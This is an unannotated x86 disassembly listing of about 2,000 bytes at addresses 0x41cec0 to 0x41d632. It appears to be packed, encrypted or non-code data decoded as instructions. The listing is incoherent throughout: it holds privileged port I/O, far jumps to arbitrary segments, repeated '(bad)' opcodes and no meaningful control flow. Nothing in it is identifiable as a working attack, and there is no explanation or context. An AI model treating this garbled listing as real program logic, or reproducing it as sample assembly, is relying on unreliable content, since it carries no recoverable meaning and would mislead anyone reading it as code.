  41cec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cec1:	adc    eax,0x6361fb17
  41cec6:	pop    es
  41cec7:	out    dx,al
  41cec8:	inc    eax
  41cec9:	call   0x4df0:0xdf221292
  41ced0:	pop    ds
  41ced1:	jne    0x41cf18
  41ced3:	xor    al,0xfb
  41ced5:	lahf   
  41ced6:	call   0xd8d7bc9
  41cedb:	jmp    0x9e2c:0xe50ee829
  41cee2:	iret   
  41cee3:	ret    
  41cee4:	mov    ds:0xaafbfe6e,eax
  41cee9:	stc    
  41ceea:	clc    
  41ceeb:	mov    ah,0xcb
  41ceed:	rcl    BYTE PTR [esi+0x1c],cl
  41cef0:	jno    0x41cf1c
  41cef2:	xor    al,0xbf
  41cef4:	clc    
  41cef5:	ds adc esi,0xffffffc8
  41cef9:	cmc    
  41cefa:	inc    eax
  41cefb:	test   DWORD PTR [ecx+0x47d53d5e],ecx
  41cf01:	inc    esi
  41cf02:	sub    al,0x45
  41cf04:	mov    eax,ds:0x86a65153
  41cf09:	sub    al,0x93
  41cf0b:	and    eax,0x9bada118
  41cf11:	or     eax,0x22de3d9e
  41cf16:	sub    al,0x16
  41cf18:	push   edi
  41cf19:	enter  0xb2f9,0x63
  41cf1d:	sub    al,0xc8
  41cf1f:	sbb    al,0x88
  41cf21:	or     esp,DWORD PTR [esi-0x7a]
  41cf24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf25:	adc    BYTE PTR [ebx],0xcc
  41cf28:	pop    ebx
  41cf29:	pop    edi
  41cf2a:	outs   dx,BYTE PTR ds:[esi]
  41cf2b:	sbb    edx,ecx
  41cf2d:	xchg   edi,ebp
  41cf2f:	mov    bl,0xce
  41cf31:	mov    eax,0xa18d04a6
  41cf36:	js     0x41cf3b
  41cf38:	pop    ss
  41cf39:	adc    DWORD PTR [eax],ebx
  41cf3b:	jbe    0x41cecf
  41cf3d:	cs jge 0x41cf99
  41cf40:	cmp    dl,dh
  41cf42:	ret    0x7fc9
  41cf45:	push   ebp
  41cf46:	fwait
  41cf47:	sbb    bh,0xb1
  41cf4a:	cmp    bh,BYTE PTR [esi+0x3c]
  41cf4d:	pop    esi
  41cf4e:	xor    eax,0x21699069
  41cf53:	pop    edi
  41cf54:	inc    eax
  41cf55:	xchg   edx,eax
  41cf56:	aaa    
  41cf57:	xchg   esi,eax
  41cf58:	ja     0x41cf7f
  41cf5a:	cmp    edx,edi
  41cf5c:	aad    0x85
  41cf5e:	popf   
  41cf5f:	fldz   
  41cf61:	or     al,0xeb
  41cf63:	pop    edx
  41cf64:	mov    ss,WORD PTR [ecx-0x18]
  41cf67:	pop    ss
  41cf68:	mov    bl,BYTE PTR [ebx+0x51]
  41cf6b:	ret    
  41cf6c:	fdivr  DWORD PTR [esi+0x62358efb]
  41cf72:	(bad)  
  41cf74:	sbb    BYTE PTR [esi-0x73],al
  41cf77:	clc    
  41cf78:	inc    ebp
  41cf79:	cmp    BYTE PTR [ebx],ch
  41cf7b:	xor    BYTE PTR [ebp-0x1bca5e7],dh
  41cf81:	push   ss
  41cf82:	pop    esp
  41cf83:	mov    dl,0x7f
  41cf85:	jge    0x41cf07
  41cf87:	stos   BYTE PTR es:[edi],al
  41cf88:	sbb    eax,0xcc747494
  41cf8d:	jmp    0x70ab:0x53cd37e5
  41cf94:	xchg   ecx,eax
  41cf95:	dec    eax
  41cf96:	sahf   
  41cf97:	(bad)  
  41cf98:	stos   DWORD PTR es:[edi],eax
  41cf99:	outs   dx,DWORD PTR ds:[esi]
  41cf9a:	popa   
  41cf9b:	mov    edi,0x1222af95
  41cfa0:	and    esp,DWORD PTR [edx-0x281a9134]
  41cfa6:	addr16 loopne 0x41d018
  41cfa9:	das    
  41cfaa:	mov    ds:0x228b556b,al
  41cfaf:	jno    0x41cfb5
  41cfb1:	out    0x1b,eax
  41cfb3:	inc    edx
  41cfb4:	pusha  
  41cfb5:	or     dl,BYTE PTR [eax-0x26a2b072]
  41cfbb:	pop    esi
  41cfbc:	out    dx,al
  41cfbd:	cmp    bl,BYTE PTR [ebx+0x4d]
  41cfc0:	xor    bl,ah
  41cfc2:	and    ch,0xe3
  41cfc5:	ja     0x41cfd1
  41cfc7:	sbb    eax,0xa48ca8b
  41cfcc:	jg     0x41cfdf
  41cfce:	test   eax,0x12509287
  41cfd3:	and    al,0x2d
  41cfd5:	xor    BYTE PTR [edi],dh
  41cfd7:	aaa    
  41cfd8:	push   DWORD PTR [eax]
  41cfda:	pop    edx
  41cfdb:	popa   
  41cfdc:	jae    0x41cf8c
  41cfde:	repnz add DWORD PTR [edi-0x1023a0b1],edx
  41cfe5:	in     eax,dx
  41cfe6:	jmp    0xfbf0f81
  41cfeb:	cmp    esi,DWORD PTR ds:0x7bd6aad
  41cff1:	pop    ebx
  41cff2:	pop    ss
  41cff3:	mov    dl,0xf2
  41cff5:	pop    edx
  41cff6:	sahf   
  41cff7:	xchg   edx,eax
  41cff8:	outs   dx,BYTE PTR ds:[esi]
  41cff9:	mov    dh,0x11
  41cffb:	push   edi
  41cffc:	mov    edi,0x16430e32
  41d001:	mov    eax,0xc9b9f649
  41d006:	dec    eax
  41d007:	lock out 0xbb,al
  41d00a:	add    eax,0xe3f26c56
  41d00f:	and    eax,0x11fa87a
  41d014:	mov    WORD PTR [eax-0x196f6cd],dx
  41d01b:	jp     0x41d066
  41d01d:	jbe    0x41d041
  41d01f:	stos   BYTE PTR es:[edi],al
  41d020:	ror    BYTE PTR [eax+esi*1+0x799d9224],cl
  41d027:	sahf   
  41d028:	or     ecx,DWORD PTR [edi]
  41d02a:	or     DWORD PTR [ebp-0x32],edi
  41d02d:	and    dl,BYTE PTR [esi]
  41d02f:	cmp    BYTE PTR [ebx-0x2a],al
  41d032:	cld    
  41d033:	ret    0x231e
  41d036:	push   ebx
  41d037:	js     0x41d094
  41d039:	pop    ss
  41d03a:	jne    0x41d026
  41d03c:	scas   eax,DWORD PTR es:[edi]
  41d03d:	shr    BYTE PTR [edx],0xe2
  41d040:	dec    edx
  41d041:	fdiv   DWORD PTR [eax+0x598ecefb]
  41d047:	cmp    ecx,DWORD PTR ds:0x1e1e2bd0
  41d04d:	cmp    ebp,DWORD PTR [eax-0x699a9b65]
  41d053:	mov    bh,0x64
  41d055:	jmp    0xce8f1497
  41d05a:	into   
  41d05b:	adc    al,0xe3
  41d05d:	pushf  
  41d05e:	mov    ch,al
  41d060:	daa    
  41d061:	push   ebx
  41d062:	fnstsw WORD PTR [esi]
  41d064:	imul   DWORD PTR es:[esi-0x5cd1660]
  41d06b:	mov    ah,0x65
  41d06d:	int3   
  41d06e:	out    0x9e,al
  41d070:	pop    esp
  41d071:	add    al,0x78
  41d073:	mov    al,0xff
  41d075:	sbb    ecx,ebp
  41d077:	mov    ch,0x53
  41d079:	push   edx
  41d07a:	and    al,0x48
  41d07c:	call   0xfd7b990d
  41d081:	mov    fs,esi
  41d083:	push   eax
  41d084:	mov    bl,0xe9
  41d086:	push   edx
  41d087:	call   0xd01c4313
  41d08c:	dec    esi
  41d08d:	xor    bh,BYTE PTR [edi+0xa]
  41d090:	ret    0x6450
  41d093:	xor    DWORD PTR [eax-0x1ee2c7c7],0xa37a0c73
  41d09d:	jecxz  0x41d0f2
  41d09f:	sbb    eax,DWORD PTR [ebp+0x84480e1]
  41d0a5:	stos   BYTE PTR es:[edi],al
  41d0a6:	mov    eax,cs:0x3ed34f3d
  41d0ac:	push   ecx
  41d0ad:	sub    bh,dl
  41d0af:	nop
  41d0b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0b1:	fiadd  WORD PTR [ebp-0x31de0999]
  41d0b7:	lahf   
  41d0b8:	pop    edi
  41d0b9:	loope  0x41d0ac
  41d0bb:	retf   
  41d0bc:	xchg   ecx,eax
  41d0bd:	imul   ebx,DWORD PTR [ecx-0x75],0x5558ab2a
  41d0c4:	add    DWORD PTR [edi],esi
  41d0c6:	mov    edx,0xe0f87a67
  41d0cb:	mov    bl,0x8e
  41d0cd:	dec    ebx
  41d0ce:	sti    
  41d0cf:	jb     0x41d05d
  41d0d1:	cmp    eax,eax
  41d0d3:	inc    edx
  41d0d4:	cmp    dl,bh
  41d0d6:	sahf   
  41d0d7:	dec    ecx
  41d0d8:	rcr    BYTE PTR [edx-0x47],1
  41d0db:	sub    BYTE PTR [ebp-0x2b7c24a9],dh
  41d0e1:	fbld   TBYTE PTR [esi-0x1cb20666]
  41d0e7:	lock pop ebx
  41d0e9:	dec    ebp
  41d0ea:	sbb    bh,bl
  41d0ec:	in     al,dx
  41d0ed:	pop    ecx
  41d0ee:	mov    DWORD PTR ds:0x2e169a05,edi
  41d0f4:	sub    DWORD PTR [esi+0x28],esi
  41d0f7:	cmp    eax,0x449bafe2
  41d0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0fd:	jns    0x41d0fc
  41d0ff:	jg     0x41d133
  41d101:	arpl   WORD PTR [edi],dx
  41d103:	aas    
  41d104:	jb     0x41d10f
  41d106:	mov    bl,0x76
  41d108:	sti    
  41d109:	push   eax
  41d10a:	xchg   ah,dh
  41d10c:	add    al,0xe0
  41d10e:	xchg   DWORD PTR [ebp-0x255bf94a],ecx
  41d114:	lods   al,BYTE PTR ds:[esi]
  41d115:	inc    edi
  41d116:	mov    esi,0xc3a24ce7
  41d11b:	jecxz  0x41d0b8
  41d11d:	push   es
  41d11e:	ret    0x2bbf
  41d121:	jmp    0x2fd3:0x996b211d
  41d128:	imul   ecx,DWORD PTR ds:0x266a33,0xffffffbb
  41d12f:	jae    0x41d124
  41d131:	cmp    edx,DWORD PTR [edx-0x27]
  41d134:	pop    ebx
  41d135:	jns    0x41d0c2
  41d137:	scas   al,BYTE PTR es:[edi]
  41d138:	mov    eax,ds:0x3d248aa8
  41d13d:	mov    BYTE PTR [ebx],ch
  41d13f:	mov    cl,0x43
  41d141:	jae    0x41d1bb
  41d143:	cmc    
  41d144:	jmp    0x60dae3ac
  41d149:	sub    eax,0x4eeb6c26
  41d14e:	in     al,dx
  41d14f:	add    bl,BYTE PTR [ebx+0x55]
  41d152:	sbb    BYTE PTR [edx+0x71],0xc4
  41d156:	int    0xa6
  41d158:	push   edx
  41d159:	imul   ax,WORD PTR ss:[esi],0x7
  41d15e:	mov    ah,0x61
  41d160:	shl    dl,cl
  41d162:	sub    eax,0xdc9f6aec
  41d167:	push   ds
  41d168:	cmp    bh,BYTE PTR [ecx+0x35]
  41d16b:	push   ss
  41d16c:	inc    al
  41d16e:	inc    eax
  41d16f:	je     0x41d19f
  41d171:	push   eax
  41d172:	fild   DWORD PTR [edi+0x70]
  41d175:	fldenv [esi+0x1f]
  41d178:	inc    ecx
  41d179:	lock mov ebp,0x5f8bdf18
  41d17f:	jle    0x41d137
  41d181:	dec    eax
  41d182:	in     al,0x84
  41d184:	mov    eax,ds:0x8fb4d0b9
  41d189:	push   edx
  41d18a:	imul   esi,DWORD PTR [edx+0x7e41d8a0],0x63
  41d191:	push   cs
  41d192:	cmp    bh,BYTE PTR [ebx-0x7442160a]
  41d198:	inc    ecx
  41d199:	rcl    BYTE PTR [esi-0x4f377015],0xeb
  41d1a0:	add    ebx,DWORD PTR [eax]
  41d1a2:	mov    BYTE PTR [ebx-0x58],dh
  41d1a5:	xchg   esi,eax
  41d1a6:	shl    DWORD PTR [edi-0x7697ad5b],1
  41d1ac:	bound  ebx,QWORD PTR [edi+0x39]
  41d1af:	pop    ebx
  41d1b0:	xor    eax,0x13da140
  41d1b5:	js     0x41d220
  41d1b7:	cmc    
  41d1b8:	mov    edi,0xae6a40d0
  41d1bd:	addr16 pop ebx
  41d1bf:	retf   0xbad4
  41d1c2:	or     ch,BYTE PTR [ebp+0x419d844]
  41d1c8:	mov    cl,0x8
  41d1ca:	sub    BYTE PTR [eax-0x145db117],dl
  41d1d0:	mov    fs,WORD PTR [edi-0x4537f6e7]
  41d1d6:	xlat   BYTE PTR ds:[ebx]
  41d1d7:	aaa    
  41d1d8:	jno    0x41d1f5
  41d1da:	push   edi
  41d1db:	shr    BYTE PTR [eax-0x2e792119],0x96
  41d1e2:	stc    
  41d1e3:	jno    0x41d1a4
  41d1e5:	push   ds
  41d1e6:	mov    ds,ebx
  41d1e8:	xchg   edi,eax
  41d1e9:	bound  esi,QWORD PTR [ecx+0x74]
  41d1ec:	mov    eax,ds:0x2e629276
  41d1f1:	adc    ecx,DWORD PTR [ebp+0x47]
  41d1f4:	or     dl,BYTE PTR [edx-0x53b6ad8]
  41d1fa:	mov    ds:0x9ac7303f,al
  41d1ff:	mov    cl,0xf0
  41d201:	jge    0x41d24f
  41d203:	and    al,0xdd
  41d205:	retf   
  41d206:	call   0xef3773b5
  41d20b:	adc    ebx,edx
  41d20d:	daa    
  41d20e:	jbe    0x41d223
  41d210:	scas   eax,DWORD PTR es:[edi]
  41d211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d212:	out    0xbc,al
  41d214:	push   ebx
  41d215:	stos   BYTE PTR es:[edi],al
  41d216:	data16 sti 
  41d218:	mov    ds:0x9d0968cf,al
  41d21d:	fisubr WORD PTR [ebx]
  41d21f:	fwait
  41d220:	repz xchg edx,eax
  41d222:	push   ds
  41d223:	xchg   edx,eax
  41d224:	inc    ebp
  41d225:	mov    dh,0x36
  41d227:	int3   
  41d228:	or     esp,ecx
  41d22a:	(bad)  
  41d22c:	cmp    ch,BYTE PTR [edx-0x220115f2]
  41d232:	(bad)  
  41d233:	xlat   BYTE PTR ds:[ebx]
  41d234:	cmp    dh,bl
  41d236:	dec    esi
  41d237:	xor    DWORD PTR ds:0x4df14b02,esi
  41d23d:	mov    cl,BYTE PTR [edi-0x3439f4ab]
  41d243:	ja     0x41d1d4
  41d245:	fs js  0x41d1ed
  41d248:	fimul  DWORD PTR [edx+0x4de3485c]
  41d24e:	cdq    
  41d24f:	push   0x54
  41d251:	pop    edx
  41d252:	sar    ah,0x99
  41d255:	xchg   edi,eax
  41d256:	fmul   QWORD PTR [ecx]
  41d258:	xchg   ebx,eax
  41d259:	and    BYTE PTR [esi-0x78],0x59
  41d25d:	jmp    0x41d234
  41d25f:	mov    WORD PTR [esi-0x67],?
  41d262:	inc    ecx
  41d263:	pop    esp
  41d264:	pop    ebp
  41d265:	dec    esi
  41d266:	dec    eax
  41d267:	dec    ebx
  41d268:	(bad)  
  41d269:	cwde   
  41d26a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d26b:	rol    ah,0x35
  41d26e:	loope  0x41d1f8
  41d270:	jmp    0xd2750023
  41d275:	mov    eax,ds:0xd0a9ebf5
  41d27a:	je     0x41d246
  41d27c:	xchg   esi,eax
  41d27d:	ins    BYTE PTR es:[edi],dx
  41d27e:	aas    
  41d27f:	add    al,0x57
  41d281:	retf   
  41d282:	lods   eax,DWORD PTR ds:[esi]
  41d283:	leave  
  41d284:	cmp    DWORD PTR [eax],0xffffff82
  41d287:	aas    
  41d288:	sbb    BYTE PTR [eax-0x7c],cl
  41d28b:	sbb    BYTE PTR [ebp-0x3f0069c2],ah
  41d291:	xor    DWORD PTR [eax+0x5],eax
  41d294:	stos   BYTE PTR es:[edi],al
  41d295:	into   
  41d296:	inc    eax
  41d297:	fst    QWORD PTR [eax-0x4]
  41d29a:	lahf   
  41d29b:	stc    
  41d29c:	push   ds
  41d29d:	jnp    0x41d2d4
  41d29f:	sbb    BYTE PTR [eax+0x4335c9ee],al
  41d2a5:	(bad)  
  41d2a6:	fsubr  QWORD PTR [edx]
  41d2a8:	test   DWORD PTR [esi],edi
  41d2aa:	arpl   cx,cx
  41d2ac:	pop    eax
  41d2ad:	xchg   ecx,eax
  41d2ae:	mov    esi,0x73a5b20a
  41d2b3:	adc    DWORD PTR [ebx-0x340aa985],edi
  41d2b9:	in     eax,dx
  41d2ba:	pop    ebp
  41d2bb:	iret   
  41d2bc:	jmp    0xaf09:0x4d7858ee
  41d2c3:	lods   al,BYTE PTR ds:[esi]
  41d2c4:	sub    DWORD PTR [edx+0x20],0x2e
  41d2c8:	inc    eax
  41d2c9:	jae    0x41d2ab
  41d2cb:	add    DWORD PTR [ebx+0x43],ecx
  41d2ce:	pop    edx
  41d2cf:	retf   
  41d2d0:	inc    ecx
  41d2d1:	sbb    esp,0xffffff88
  41d2d4:	pop    edx
  41d2d5:	shl    DWORD PTR [ecx+0x2109d335],0xb4
  41d2dc:	pop    ds
  41d2dd:	out    0xf5,eax
  41d2df:	ds push ebx
  41d2e1:	and    BYTE PTR [eax-0x267ab8a6],ah
  41d2e7:	imul   eax,DWORD PTR [edx+0x81df097],0x1c
  41d2ee:	pop    esi
  41d2ef:	repnz xor DWORD PTR [eax-0x65488ca6],ebx
  41d2f6:	sub    DWORD PTR [eax],esi
  41d2f8:	add    al,0xbb
  41d2fa:	jnp    0x41d352
  41d2fc:	call   0x6408b6ec
  41d301:	jo     0x41d336
  41d303:	sar    BYTE PTR [ecx],cl
  41d305:	cli    
  41d306:	cwde   
  41d307:	adc    esp,DWORD PTR [edx+ecx*8]
  41d30a:	or     bl,BYTE PTR [edi+edx*4]
  41d30d:	add    bl,BYTE PTR [ebx+0x15]
  41d310:	xlat   BYTE PTR ds:[ebx]
  41d311:	add    al,0x82
  41d313:	ror    edi,cl
  41d315:	xor    ebp,DWORD PTR [eax]
  41d317:	mov    dh,0x8e
  41d319:	mov    al,ds:0xae201a1e
  41d31e:	and    BYTE PTR [ebx+0x44],ah
  41d321:	dec    ebp
  41d322:	call   0x11e8403e
  41d327:	inc    esp
  41d328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d329:	lods   eax,DWORD PTR ds:[esi]
  41d32b:	mov    dl,0x99
  41d32d:	push   0xd6a61761
  41d332:	inc    eax
  41d333:	pop    ds
  41d334:	sub    al,0x5c
  41d336:	stc    
  41d337:	jne    0x41d316
  41d339:	daa    
  41d33a:	ror    BYTE PTR [ebp+0x246c13df],1
  41d340:	sub    eax,0xd375428b
  41d345:	out    0x1d,eax
  41d347:	and    al,0x6b
  41d349:	add    edi,DWORD PTR [ecx+esi*8]
  41d34c:	test   DWORD PTR [edx+0x59],esi
  41d34f:	mov    edx,edi
  41d351:	je     0x41d361
  41d353:	lock inc ecx
  41d355:	cmp    eax,0x60b1fbc
  41d35a:	cdq    
  41d35b:	adc    eax,0x16bd1060
  41d360:	mov    dl,0xc8
  41d362:	and    al,0xd2
  41d364:	imul   ebp,DWORD PTR [edx],0xffffffcf
  41d367:	mov    bh,BYTE PTR [ebx+0x2af40374]
  41d36d:	or     BYTE PTR [esp+ecx*1+0x11dcc20d],0xf1
  41d375:	call   0x1695:0x6d5e35c5
  41d37c:	adc    bh,dl
  41d37e:	(bad)  
  41d37f:	lods   al,BYTE PTR ds:[esi]
  41d380:	sbb    cl,BYTE PTR [edx+edx*4+0x282a67c2]
  41d387:	out    0xaf,eax
  41d389:	fcomp  DWORD PTR [edx+0x674a514e]
  41d38f:	adc    BYTE PTR [edx],0xb0
  41d392:	and    DWORD PTR [eax-0x7a],ebp
  41d395:	sbb    cl,dh
  41d397:	out    dx,al
  41d398:	jge    0x41d31d
  41d39a:	mov    ds:0x7dc31bf9,al
  41d39f:	fs (bad) 
  41d3a1:	jbe    0x41d35e
  41d3a3:	mov    esp,0xb74d2ce1
  41d3a8:	mov    al,al
  41d3aa:	mov    ebp,0x29116015
  41d3af:	hlt    
  41d3b0:	loopne 0x41d379
  41d3b2:	mov    ecx,edi
  41d3b4:	pop    ebx
  41d3b5:	jae    0x41d400
  41d3b7:	jno    0x41d349
  41d3b9:	in     al,dx
  41d3ba:	pop    ebx
  41d3bb:	sbb    al,0xb9
  41d3bd:	fdivr  DWORD PTR [bx]
  41d3c0:	mov    eax,0xd40d477f
  41d3c5:	nop
  41d3c6:	leave  
  41d3c7:	mov    ebp,0xe2011fbe
  41d3cc:	into   
  41d3cd:	xchg   al,dh
  41d3cf:	(bad)  
  41d3d0:	retf   
  41d3d1:	sbb    al,0x4a
  41d3d3:	mov    dh,0xd0
  41d3d5:	pop    ebp
  41d3d6:	dec    esi
  41d3d7:	cli    
  41d3d8:	jp     0x41d373
  41d3da:	dec    ebp
  41d3db:	mov    WORD PTR [ebp+0x7d],es
  41d3de:	in     eax,dx
  41d3df:	out    dx,eax
  41d3e0:	pop    es
  41d3e1:	cwde   
  41d3e2:	fsubr  DWORD PTR [eax+0x4cb26ac9]
  41d3e8:	cld    
  41d3e9:	push   ecx
  41d3ea:	or     al,0xf6
  41d3ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3ed:	mov    dl,0x4d
  41d3ef:	mov    ch,0x40
  41d3f1:	mov    ah,0xb7
  41d3f3:	or     BYTE PTR [ebp-0x301f4a6d],0xc0
  41d3fa:	or     esp,ecx
  41d3fc:	pusha  
  41d3fd:	sub    bh,BYTE PTR [esi+ebx*1-0x377f0408]
  41d404:	cmp    eax,0xecddeda8
  41d409:	mov    edx,0x64dce600
  41d40e:	mov    al,0x6c
  41d410:	addr16 out dx,eax
  41d412:	pop    es
  41d413:	or     BYTE PTR [ebx],0xd0
  41d416:	rcl    BYTE PTR [esi+0xa1c9b7d],1
  41d41c:	or     ecx,ebx
  41d41e:	leave  
  41d41f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d420:	addr16 cmp eax,0x8bb9121d
  41d426:	mov    ah,0x58
  41d428:	jb     0x41d492
  41d42a:	mov    bh,0xc0
  41d42c:	cmp    esi,DWORD PTR [eax]
  41d42e:	fcomp  DWORD PTR [ecx+ebp*8-0x9]
  41d432:	fimul  DWORD PTR [edx+edx*8-0xf]
  41d436:	shl    BYTE PTR [ecx],cl
  41d438:	repnz retf 0xae21
  41d43c:	test   ah,dh
  41d43e:	jge    0x41d3c6
  41d440:	fisub  DWORD PTR [edi+0x17bdfefc]
  41d446:	xor    edi,DWORD PTR [esi+0x3554e4b2]
  41d44c:	mov    dh,0xc7
  41d44e:	or     DWORD PTR [edx+0x7187a87a],ebp
  41d454:	pop    esi
  41d455:	mov    ch,0x7b
  41d457:	les    esp,FWORD PTR [ecx+eax*1+0x7b]
  41d45b:	or     bl,BYTE PTR [esi+eax*1-0x5b]
  41d45f:	mov    bh,0x43
  41d461:	loopne 0x41d426
  41d463:	pop    ecx
  41d464:	and    eax,0xd6e15cb9
  41d469:	pop    ss
  41d46a:	popf   
  41d46b:	pop    edi
  41d46c:	xchg   edi,eax
  41d46d:	out    0x75,eax
  41d46f:	xchg   ecx,eax
  41d470:	mov    ds:0x633af9fb,al
  41d475:	mov    edi,0xd834e4ee
  41d47a:	fistp  DWORD PTR [ebx-0x7]
  41d47d:	test   DWORD PTR [ebp-0x5744a00c],edi
  41d483:	call   0xd2c6:0x1bae2dfb
  41d48a:	test   eax,edi
  41d48c:	xchg   esp,eax
  41d48d:	in     eax,0x35
  41d48f:	add    DWORD PTR [ebp+ebx*2+0x15e82f13],ebx
  41d496:	sar    ebp,1
  41d498:	aaa    
  41d499:	jns    0x41d4e0
  41d49b:	jecxz  0x41d4c5
  41d49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d49e:	push   0xeae72ef
  41d4a3:	dec    eax
  41d4a4:	daa    
  41d4a5:	arpl   WORD PTR [eax],ax
  41d4a7:	sub    al,0xcd
  41d4a9:	sbb    al,0x35
  41d4ab:	cld    
  41d4ac:	sub    cl,BYTE PTR ds:0x387e94b9
  41d4b2:	cmp    DWORD PTR [edx],edi
  41d4b4:	xchg   ebx,eax
  41d4b5:	in     eax,0xbc
  41d4b7:	addr16 mov ch,0x91
  41d4ba:	mov    bh,BYTE PTR [eax+0x6]
  41d4bd:	nop
  41d4be:	pop    ebx
  41d4bf:	ss jo  0x41d4c1
  41d4c2:	xchg   esi,eax
  41d4c3:	inc    eax
  41d4c4:	fcmovb st,st(1)
  41d4c6:	(bad)  
  41d4c7:	ja     0x41d535
  41d4c9:	(bad)  
  41d4cb:	out    0xd,eax
  41d4cd:	xor    bl,BYTE PTR [ebx+0x3e8bf1c7]
  41d4d3:	jmp    0x56d7:0x1835f987
  41d4da:	cmp    eax,0xa6c7c3b6
  41d4df:	test   DWORD PTR [edi+0x2d],eax
  41d4e2:	pop    esp
  41d4e3:	fsub   QWORD PTR [edi+0x32]
  41d4e6:	mov    edx,DWORD PTR [eax+0x33]
  41d4e9:	cmc    
  41d4ea:	jne    0x41d4b2
  41d4ec:	fst    DWORD PTR [ebx+0xf36f0a3]
  41d4f2:	js     0x41d500
  41d4f4:	mov    edx,0x4b4e45dc
  41d4f9:	adc    al,0x99
  41d4fb:	jae    0x41d4fe
  41d4fd:	or     eax,0x610b7849
  41d502:	mov    bh,0xb9
  41d504:	fcmovnbe st,st(0)
  41d506:	add    DWORD PTR [esi],esp
  41d508:	or     al,0x62
  41d50a:	loop   0x41d490
  41d50c:	sahf   
  41d50d:	clc    
  41d50e:	nop
  41d50f:	mov    BYTE PTR [ebx+0x648ea889],0x81
  41d516:	push   ecx
  41d517:	aas    
  41d518:	sub    eax,0xb95e2793
  41d51d:	rol    ebx,0x74
  41d520:	imul   edi,DWORD PTR [ebx],0x67
  41d523:	jle    0x41d53f
  41d525:	sbb    eax,DWORD PTR [ebp-0x2180a38f]
  41d52b:	test   DWORD PTR [edx],edi
  41d52d:	push   0xfffffffd
  41d52f:	int    0x4d
  41d531:	fsubr  QWORD PTR [ebx-0xbf5a82c]
  41d537:	sahf   
  41d538:	pusha  
  41d539:	(bad)  
  41d53a:	je     0x41d5ae
  41d53c:	mov    ds:0x82caf52,al
  41d541:	xor    DWORD PTR [eax-0x1ec8e838],edx
  41d547:	jns    0x41d5a2
  41d549:	mov    bl,BYTE PTR [ecx]
  41d54b:	test   DWORD PTR [eax+0x64],0x1a8b5fcc
  41d552:	add    DWORD PTR [ebp-0x2d],ebx
  41d555:	mov    cl,0x20
  41d557:	lock shr BYTE PTR [esi+0xdf04731],cl
  41d55e:	shl    DWORD PTR ss:[eax+0x48b01141],1
  41d565:	dec    eax
  41d566:	push   edx
  41d567:	pop    ss
  41d568:	(bad)  
  41d56a:	push   edx
  41d56b:	jge    0x41d525
  41d56d:	nop
  41d56e:	ret    0xee1d
  41d571:	jecxz  0x41d5b1
  41d573:	nop
  41d574:	cmp    edx,ebp
  41d576:	xchg   DWORD PTR [ecx],esp
  41d578:	and    eax,0x198ef9c3
  41d57d:	jnp    0x41d576
  41d57f:	dec    esp
  41d580:	xlat   BYTE PTR ds:[ebx]
  41d581:	xchg   ebx,eax
  41d582:	pop    ds
  41d583:	in     eax,0x5
  41d585:	lods   al,BYTE PTR ds:[esi]
  41d586:	std    
  41d587:	xchg   edi,eax
  41d588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d589:	xor    BYTE PTR [edx],ah
  41d58b:	xlat   BYTE PTR ds:[ebx]
  41d58c:	xchg   ebx,eax
  41d58d:	cdq    
  41d58e:	pop    edx
  41d58f:	imul   DWORD PTR [ebp+0x4bf2ce1]
  41d595:	loopne 0x41d5e7
  41d597:	xchg   esi,eax
  41d598:	pop    edi
  41d599:	das    
  41d59a:	xchg   esp,eax
  41d59b:	ja     0x41d557
  41d59d:	inc    ecx
  41d59e:	dec    ebp
  41d59f:	and    BYTE PTR [eax+ebx*4-0x3ebc470],dh
  41d5a6:	mov    bh,0xab
  41d5a8:	stos   BYTE PTR es:[edi],al
  41d5a9:	mov    cl,0xd3
  41d5ab:	jb     0x41d584
  41d5ad:	jae    0x41d60f
  41d5af:	mov    ch,0x3d
  41d5b1:	and    edi,DWORD PTR [ecx+0x6f]
  41d5b4:	cmp    eax,0xc48c112e
  41d5b9:	retf   
  41d5ba:	xchg   edx,eax
  41d5bb:	icebp  
  41d5bc:	imul   esi,ecx,0xc
  41d5bf:	cmp    bl,al
  41d5c1:	or     edi,DWORD PTR [eax+0x7841b788]
  41d5c7:	xchg   ebp,eax
  41d5c8:	imul   esp,DWORD PTR [edi+0xb8fc5aa],0xbbf7e74a
  41d5d2:	mov    dh,bl
  41d5d4:	sti    
  41d5d5:	(bad)  
  41d5d6:	shr    BYTE PTR [eax-0x7c],1
  41d5d9:	jp     0x41d5da
  41d5db:	jo     0x41d65b
  41d5dd:	(bad)  
  41d5de:	cwde   
  41d5df:	dec    edi
  41d5e0:	shl    DWORD PTR [edx+0x59],1
  41d5e3:	fcomp  QWORD PTR [ecx]
  41d5e5:	imul   esp,DWORD PTR [ebx+0x26011e9d],0xffffffad
  41d5ec:	fstp   DWORD PTR [ecx+0x7c63a2]
  41d5f2:	aad    0x6d
  41d5f4:	jp     0x41d59f
  41d5f6:	push   0x59
  41d5f8:	cmp    ebx,DWORD PTR [edx+0x783cb80e]
  41d5fe:	add    eax,0xdd7ec9c3
  41d603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d604:	mov    ch,0x18
  41d606:	sti    
  41d607:	stc    
  41d608:	add    bl,al
  41d60a:	int3   
  41d60b:	in     al,dx
  41d60c:	cmp    al,0xa5
  41d60e:	push   esi
  41d60f:	mov    ebp,0xeb339098
  41d614:	cmp    eax,0xb72bacba
  41d619:	cwde   
  41d61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d61b:	pop    esi
  41d61c:	mov    bl,BYTE PTR [edx]
  41d61e:	bound  eax,QWORD PTR [esi]
  41d620:	cmp    eax,0xff9fa0a3
  41d625:	fwait
  41d626:	pop    ebp
  41d627:	out    dx,al
  41d628:	call   0xf4911c18
  41d62d:	jg     0x41d5d4
  41d62f:	inc    edx
  41d630:	aaa    
  41d631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d632:	adc    ch,BYTE PTR [edx+edx*1+0x105322aa]
